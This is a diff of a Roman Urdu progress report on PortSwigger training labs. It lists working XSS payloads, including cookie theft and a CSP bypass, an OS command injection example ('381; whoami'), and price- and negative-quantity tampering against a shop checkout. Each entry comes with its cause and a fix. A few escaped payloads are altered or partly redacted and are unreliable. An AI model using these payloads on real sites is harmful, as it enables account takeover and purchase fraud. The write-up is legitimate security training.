@@ -1,6 +1,6 @@
 # PortSwigger Labs — Progress Report (15 Nov 2026, updated 24 Nov 2026)
 
-**Total: 53 / 272 labs solved aur verify hue** (SQL Injection 15/18, XSS 29/30, Authentication 3/14, Path Traversal 5/6, Business Logic 1). Pehle set ke 48 labs mein se 44 solve hue; us ke baad 272-lab plan ke naye topics shuru hain.
+**Total: 54 / 272 labs solved aur verify hue** (SQL Injection 15/18, XSS 29/30, Authentication 3/14, Path Traversal 5/6, Business Logic 2). Pehle set ke 48 labs mein se 44 solve hue; us ke baad 272-lab plan ke naye topics shuru hain.
 Kaam 15 Nov ~14:00–18:25 PKT chala, PortSwigger account "Arbaz Ahmed Naveed" (arbazchuahan@gmail.com) se signed in.
 Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal labs, permission wala tareeqa.
 
@@ -26,7 +26,7 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 
 1. **Reflected XSS, HTML, nothing encoded** — `/?search=<script>alert(1)</script>` — alert chala. Kyun: search term bina encoding ke page mein aa jata hai.
 2. **Stored XSS, HTML, nothing encoded** — comment `<script>alert(1)</script>` — submit karte hi solved. Kyun: comment save ho kar HTML ki tarah dikhaya jata hai.
-3. **DOM XSS, document.write** — `/?search="><svg onload=alert(1)>` — alert chala. Kyun: search term `<img src="...">` ke andar likha jata hai, `">` se bahar nikal aata hai.
+3. **DOM XSS, document.write** — `/?search=\"><svg onload=alert(1)>` — alert chala. Kyun: search term `<img src="...">` ke andar likha jata hai, `\">` se bahar nikal aata hai.
 4. **DOM XSS, innerHTML** — `/?search=<svg onload=alert(1)>` — alert chala. Kyun: innerHTML se SVG banta hai aur onload chalta hai.
 5. **DOM XSS, jQuery href** — `/feedback?returnPath=javascript:alert(document.cookie)`, phir "Back" link click — alert chala. Kyun: jQuery Back link ka href returnPath se lagata hai.
 6. **DOM XSS, jQuery selector, hashchange** — exploit-server iframe, hash `#<img src=x onerror=print()>` — print chala. Kyun: hash badalne se handler chalta hai aur `$()` img banata hai.
@@ -35,14 +35,14 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 9. **Reflected XSS, JavaScript string, angle brackets encoded** — `/?search='-alert(1)-'` — alert chala. Kyun: `'` se string band hoti hai aur `-alert(1)-` code ban jata hai.
 10. **DOM XSS, document.write, select element** — `</option></select><img src=x onerror=alert(1)>` via storeId — solved. Kyun: value `<select><option>` ke andar likhi jati hai, dono tags band karne parte hain.
 11. **DOM XSS, AngularJS expression** — `/?search={{$on.constructor('alert(1)')()}}` — alert chala. Kyun: search term AngularJS expression ki tarah evaluate hota hai.
-12. **Reflected DOM XSS** — `/?search=\"-alert(1)}//` — alert chala. Kyun: backslash-quote JSON string se bahar nikalta hai aur `eval()` code chalata hai.
+12. **Reflected DOM XSS** — `/?search=\\"-alert(1)}//` — alert chala. Kyun: backslash-quote JSON string se bahar nikalta hai aur `eval()` code chalata hai.
 13. **Stored DOM XSS** — comment `<><img src=1 onerror=alert(1)>` — dobara dekhne par alert chala. Kyun: pehla `<>` sanitizer ki encoding kha jata hai, asal img bach jata hai.
-14. **Reflected XSS, most tags blocked** — exploit-server iframe `?search="><body onresize=print()>` + iframe resize — Solved. Kyun: injected body asal body se mil jata hai aur resize par onresize chalta hai.
+14. **Reflected XSS, most tags blocked** — exploit-server iframe `?search=\"><body onresize=print()>` + iframe resize — Solved. Kyun: injected body asal body se mil jata hai aur resize par onresize chalta hai.
 15. **Reflected XSS, all tags blocked except custom ones — SOLVED (18:12 UTC verify).** Payload `<xss id=x onfocus=alert(document.cookie) tabindex=0>` + `#x`. Kyun: custom `<xss>` tag filter se guzar jata hai, `#x` us par focus karta hai aur onfocus chalta hai.
 16. **Reflected XSS, some SVG markup allowed** — `<svg><animatetransform onbegin=alert(document.domain)>` — alert chala. Kyun: SVG tags aur events block nahi hain, animation ka onbegin alert chalata hai.
 17. **Reflected XSS, canonical link tag** — URL `?%27accesskey=%27x%27onclick=%27alert(document.domain)`, phir Alt+X — alert chala. Kyun: quote canonical link ke href se bahar nikalta hai aur accesskey + onclick lagata hai.
 18. **Reflected XSS, JS string, single quote + backslash escaped** — `</script><script>alert(document.domain)</script>` — alert chala. Kyun: sirf quotes aur backslash escape hain, script tag band karke string context se bahar nikal jate hain.
-19. **Reflected XSS, JS string, angle brackets + double quotes encoded, single quotes escaped** — `\'-alert(document.domain)//` — alert chala. Kyun: backslash escape nahi hota, app ka backslash + payload ka backslash `\\` ban jata hai aur quote string band kar deta hai.
+19. **Reflected XSS, JS string, angle brackets + double quotes encoded, single quotes escaped** — `\\'-alert(document.domain)//` — alert chala. Kyun: backslash escape nahi hota, app ka backslash + payload ka backslash `\\\\` ban jata hai aur quote string band kar deta hai.
 20. **Stored XSS, onclick event, angle brackets + double quotes encoded, single quotes + backslash escaped** — comment ki Website field: `http://foo?&apos;-alert(document.domain)-&apos;` — solved. Kyun: `&apos;` onclick attribute parse hote waqt quote ban jata hai.
 21. **Reflected XSS, template literal** — `${alert(document.domain)}` — alert chala. Kyun: template literal ke andar expression evaluate hota hai.
 22. **Exploiting XSS to steal cookies** — stored comment ne victim se uska session cookie comment ki tarah post karwaya, phir woh cookie values apne browser mein lagakar admin account khul gaya. Kyun: stored XSS victim ke browser se uska cookie nikalwata hai.
@@ -51,8 +51,8 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 25. **Reflected XSS, AngularJS sandbox escape without strings** — `toString().constructor.prototype.charAt=[].join` + orderBy/fromCharCode se `x=alert(1)` banaya — alert chala. Kyun: charAt overwrite karke sandbox check bypass hota hai, fromCharCode bina string ke code banata hai.
 26. **Reflected XSS, AngularJS sandbox escape and CSP** — exploit-server redirect + `#x` focus, ng-focus handler, orderBy `$event.composedPath()` se window tak pahunch kar alert chalaya. Kyun: focus ng-focus chalata hai (CSP bypass) aur composedPath window object deta hai.
 27. **Reflected XSS, event handlers + href blocked** — `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>` — alert chala. Kyun: animate na event handler hai na href attribute, is liye filter se guzar jata hai.
-28. **Reflected XSS, JavaScript URL, some characters blocked** — `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'` + "Back to blog" click — alert(1337) chala. Kyun: JS string/object se bahar nikal kar arrow function throw karta hai aur window.toString set hota hai.
-29. **Reflected XSS protected by CSP, with CSP bypass — SOLVED (18:25 PKT verify).** Payload: search=`<script>alert(1)</script>` + token=`;script-src-elem 'unsafe-inline'`. Kyun: CSP ka report-uri token parameter ko reflect karta hai, is liye token mein semicolon se naya script-src-elem rule lag gaya aur inline script chal gaya. (Pehle CSP injection search mein daala tha — woh galat tha; token hi report-uri mein jata hai.)
+28. **Reflected XSS, JavaScript URL, some characters blocked** — `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+',{x:'` + "Back to blog" click — alert(1337) chala. Kyun: JS string/object se bahar nikal kar arrow function throw karta hai aur window.toString set hota hai.
+29. **Reflected XSS protected by CSP, with CSP bypass — SOLVED (18:25 PKT verify).** Payload: search=`<script>alert(1)</script>` + token=<redacted>;script-src-elem 'unsafe-inline'`. Kyun: CSP ka report-uri token parameter ko reflect karta hai, is liye token mein semicolon se naya script-src-elem rule lag gaya aur inline script chal gaya. (Pehle CSP injection search mein daala tha — woh galat tha; token hi report-uri mein jata hai.)
 30. **Reflected XSS protected by very strict CSP, with dangling markup attack — NOT SOLVED (18:25 PKT).** Exploit banaya aur deliver kiya — victim ne CSRF token bhi bhej diya — lekin victim ka email change kabhi complete nahi hua aur lab "Solved" nahi hua. Dobara delivery bhi ki, wahi result. Ye lab **aap ke ek click** ki zaroorat rakhta hai: browser mein Lab 29 ke exploit server tab par khud "Deliver exploit to victim" dabana hai.
 
 ## Authentication — 3 solved
@@ -75,9 +75,10 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 
 **Concept (Roman Urdu):** OS Command Injection tab hoti hai jab website user ka input seedha server ke operating system command mein jor deti hai. Masalan product ka stock check karne ke liye server `stockreport.pl 381` jaisi command chalata ho — agar attacker `381; whoami` bhej de to `;` ke baad wala hissa alag command ban kar chal jata hai aur us ka output page par aa jata hai. Blind wale labs mein output nazar nahi aata: wahan `sleep 10` jaisi command se time delay paida kar ke pata chalaya jata hai ke injection chali ya nahi, ya output ko kisi file mein redirect kar ke parha jata hai. Out-of-band wale labs (Lab 4–5) mein Burp Collaborator chahiye hota hai — server se bahar kisi aur jagah signal bheja jata hai. Roktham: user input ko kabhi seedha OS command mein na jorein; fixed commands aur allowlist use karein, aur input ko strictly validate karein.
 
-## Business Logic — 1 solved
+## Business Logic — 2 solved
 
 1. **Excessive trust in client-side controls** — SOLVED 24 Nov 2026. Lab ki shop mein `wiener:peter` se login kiya (store credit $100.00), Lightweight "l33t" Leather Jacket ($1337.00, productId=1) cart mein dala — lekin `POST /cart` request mein chhupa hua `price` parameter (cents mein 133700) client ki taraf se aata hai aur server bina check kiye maan leta hai; wahi POST `price=100` ($1.00) ke saath bheja to cart ka total $1.00 ho gaya, phir cart ke csrf token ke saath checkout POST kiya aur lab ne "Congratulations, you solved the lab!" dikhaya. Kyun: server ne client ki bheji hui price par bharosa kar liya — hidden field ya client-side validation security nahi hai. Roktham: price aur roles hamesha server-side database se check karein; har parameter ko server par validate karein.
+2. **High-level logic vulnerability** — SOLVED 24 Nov 2026. Lab ki shop mein `wiener:peter` se login kiya (store credit $100.00), cart mein Lightweight "l33t" Leather Jacket ($1337.00, productId=1) aur Eco Boat ($1.83, productId=16) dala — total $1338.83 ho gaya; phir `POST /cart` mein Eco Boat ki quantity `-700` bhej di (negative quantity), Eco Boat wali line taqreeban -$1279 ho gayi aur cart ka total $57.83 reh gaya, phir cart ke csrf token ke saath checkout POST kiya aur lab ne "Congratulations, you solved the lab!" dikhaya. Kyun: server ne quantity ko check kiye baghair maan liya — negative quantity asal khareed nahi hai, lekin server ne us se total ghata diya. Roktham: quantity hamesha server-side validate karein (quantity > 0 honi chahiye) aur total server-side prices se dobara calculate karein; client ki bheji hui kisi bhi value par bharosa na karein.
 
 ## Kahan ruka aur kyun
 
@@ -93,5 +94,5 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 1. Lab 29 — aap ka ek click (exploit server tab par "Deliver exploit to victim").
 2. Blind SQLi mein baaki 3 labs — Lab 13 (concept only), Lab 16 aur Lab 17 (out-of-band, Burp Collaborator ke saath); Lab 11, 12, 14 aur 15 ho gaye.
 3. Authentication ki baaki labs ek ek kar ke jari rahengi (Lab 2 aur Lab 3 ke concepts pehle alfaaz mein).
-4. Business Logic Lab 1 solve ho gaya (24 Nov 2026); Business Logic ki baaki labs ek ek kar ke jari rahengi — phir Information Disclosure, Access Control, aur aage recorded continuation order mein.
+4. Business Logic Lab 1 aur Lab 2 solve ho gaye (24 Nov 2026); Business Logic ki baaki labs ek ek kar ke jari rahengi — phir Information Disclosure, Access Control, aur aage recorded continuation order mein.
 5. Har step ke baad ye file GitHub par update hoti rahegi.
